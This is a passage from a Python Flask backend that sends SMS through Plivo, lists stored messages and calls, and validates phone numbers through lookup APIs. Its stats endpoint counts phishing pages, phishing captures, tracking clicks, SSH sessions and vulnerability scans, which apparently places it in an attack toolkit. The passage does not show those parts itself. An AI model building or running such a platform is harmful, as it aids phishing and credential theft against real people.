        try:
            response = plivo_client.messages.create(
                src=TWILIO_PHONE_NUMBER,
                dst=to,
                text=body
            )
            return jsonify({'provider': 'plivo', 'status': 'sent', 'uuid': response.message_uuid})
        except Exception as e:
            return jsonify({'error': f'All providers failed: {str(e)}'}), 500
    
    return jsonify({'error': 'No SMS provider configured'}), 500

# =====================================================
# SMS & CALL - GET MESSAGES
# =====================================================
@app.route('/api/sms/messages', methods=['GET'])
def sms_get_messages():
    sms_msgs = [m for m in messages if m.get('type') == 'sms']
    return jsonify({'messages': sms_msgs[-50:], 'total': len(sms_msgs)})

@app.route('/api/call/messages', methods=['GET'])
def call_get_messages():
    call_msgs = [m for m in messages if m.get('type') == 'call']
    return jsonify({'calls': call_msgs[-50:], 'total': len(call_msgs)})

# =====================================================
# LOOKUP
# =====================================================
@app.route('/api/lookup/veriphone', methods=['POST'])
def lookup_veriphone():
    data = request.json
    phone = data.get('phone')
    
    if not VERIPHONE_API_KEY:
        return jsonify({'error': 'VERIPHONE_API_KEY not configured'}), 500
    
    try:
        resp = requests.get(f'https://api.veriphone.io/v2/verify?phone={phone}&key={VERIPHONE_API_KEY}', timeout=10)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/lookup/numlookup', methods=['POST'])
def lookup_numlookup():
    data = request.json
    phone = data.get('phone')
    
    if not NUMLOOKUP_API_KEY:
        return jsonify({'error': 'NUMLOOKUP_API_KEY not configured'}), 500
    
    try:
        resp = requests.get(f'https://api.numlookupapi.com/v1/validate/{phone}?apikey={NUMLOOKUP_API_KEY}', timeout=10)
        return jsonify(resp.json())
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# =====================================================
# STATS
# =====================================================
@app.route('/api/stats', methods=['GET'])
def get_stats():
    return jsonify({
        'scans': len(scan_results),
        'vuln_scans': len(vuln_results),
        'ssh_sessions': len(ssh_sessions),
        'phish_pages': len(phish_pages),
        'phish_captures': len(phish_captures),
        'tracking_links': len(tracking_links),
        'tracking_clicks': len(tracking_clicks),
        'messages': len(messages),
        'phone': TWILIO_PHONE_NUMBER,
        'uptime': datetime.now().isoformat()
    })

# ===== ERROR HANDLERS =====
@app.errorhandler(404)
def not_found(e):
    return jsonify({'error': 'Endpoint not found'}), 404

@app.errorhandler(500)
def server_error(e):
    return jsonify({'error': 'Internal server error'}), 500

# ===== MAIN =====
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)